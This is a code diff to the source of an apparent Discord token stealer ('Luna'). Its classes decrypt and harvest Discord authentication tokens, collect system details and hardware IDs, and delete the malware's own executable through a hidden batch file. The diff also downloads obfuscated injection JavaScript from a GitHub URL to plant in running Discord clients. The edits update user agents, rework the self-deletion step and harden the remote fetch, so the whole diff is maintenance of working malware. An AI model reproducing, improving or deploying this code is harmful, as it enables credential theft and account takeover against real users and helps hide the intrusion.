@@ -215,8 +215,8 @@ class PcInfo:
         computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
         cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
         gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
-        ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
-                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
+        ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
+                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
         hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
@@ -327,7 +327,7 @@ class Discord:
                             for y in re.findall(self.encrypted_regex, line):
                                 token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                 r = requests.get(self.baseurl, headers={
-                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                     'Content-Type': 'application/json',
                                     'Authorization': token})
                                 if r.status_code == 200:
@@ -342,7 +342,7 @@ class Discord:
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
                             r = requests.get(self.baseurl, headers={
-                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                 'Content-Type': 'application/json',
                                 'Authorization': token})
                             if r.status_code == 200:
@@ -359,7 +359,7 @@ class Discord:
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
                             r = requests.get(self.baseurl, headers={
-                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                 'Content-Type': 'application/json',
                                 'Authorization': token})
                             if r.status_code == 200:
@@ -428,7 +428,7 @@ class Discord:
             val = ""
             methods = ""
             headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                 'Content-Type': 'application/json',
                 'Authorization': token
             }
@@ -819,21 +819,25 @@ class AntiSpam:
 
 class SelfDestruct():
     def __init__(self):
-        self.path, self.frozen = self.getfile()
         self.delete()
 
-    def getfile(self):
-        if hasattr(sys, 'frozen'):
-            return (sys.executable, True)
-        else:
-            return (__file__, False)
-
     def delete(self):
-        if self.frozen:
-            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(self.path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-            os._exit(0)
-        else:
-            os.remove(self.path)
+        try:
+            path = sys.argv[0]
+            batch_content = f"""@echo off
+ping 127.0.0.1 -n 2 > nul
+del "{path}"
+ping 127.0.0.1 -n 2 > nul
+del "%~f0"
+"""
+            if os.path.exists(path):
+                batch_path = os.path.join(os.path.dirname(path), "self_delete.bat")
+                with open(batch_path, "w") as batch_file:
+                    batch_file.write(batch_content)
+                subprocess.Popen(batch_path, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
+            sys.exit()
+        except Exception:
+            sys.exit()
 
 
 class Clipboard:
@@ -863,7 +867,10 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js').text
+        response = requests.get('https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js')
+        if response.status_code != 200:
+            return
+        self.code = response.text
 
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
